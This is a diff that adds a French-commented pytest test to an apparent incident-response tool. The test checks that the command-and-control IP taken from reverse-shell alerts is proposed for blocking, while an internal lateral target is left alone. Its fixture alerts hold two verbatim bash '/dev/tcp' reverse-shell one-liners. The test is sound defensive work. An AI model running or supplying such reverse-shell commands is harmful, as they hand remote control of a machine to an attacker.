@@ -89,6 +89,25 @@ def test_block_ip_exclut_parc_et_assets_et_ordonne_public_first(monkeypatch):
     assert vals[0] == "45.134.26.87"           # publique d'abord (ordre attaquant)
 
 
+def test_block_ip_extrait_c2_du_reverse_shell(monkeypatch):
+    """Le C2 d'un reverse shell /dev/tcp (execve auditd, sans srcip) devient une
+    cible de blocage ; une cible /dev/tcp INTERNE (latéral) reste écartée.
+    Régression case 72 (2026-07-31) : 2667 détections, 0 blocage."""
+    monkeypatch.setattr(mitigate, "_ips_agents", lambda: set())
+    inc = {"id": 1, "agent_id": "011"}
+    alertes = [
+        {"agent_id": "011", "srcip": None, "srcuser": None, "entity": None,
+         "rule_desc": "reverse shell",
+         "raw": {"full_log": "bash -i >& /dev/tcp/45.9.1.2/4444 0>&1"}},   # C2 externe
+        {"agent_id": "011", "srcip": None, "srcuser": None, "entity": None,
+         "raw": {"full_log": "bash -i >& /dev/tcp/192.168.10.9/9001 0>&1"}},  # interne = latéral
+    ]
+    vals = [ip for _ag, ip in
+            _cibles_par_machine("propose_block_ip", inc, alertes)]
+    assert "45.9.1.2" in vals          # C2 externe -> bloqué
+    assert "192.168.10.9" not in vals   # cible interne -> pas bloquée
+
+
 def test_ip_privee_ordonne_sans_exclure():
     # _ip_privee sert au tri, pas à l'exclusion : le C2 privé du lab reste bloquable.
     assert _ip_privee("10.8.0.9") is True
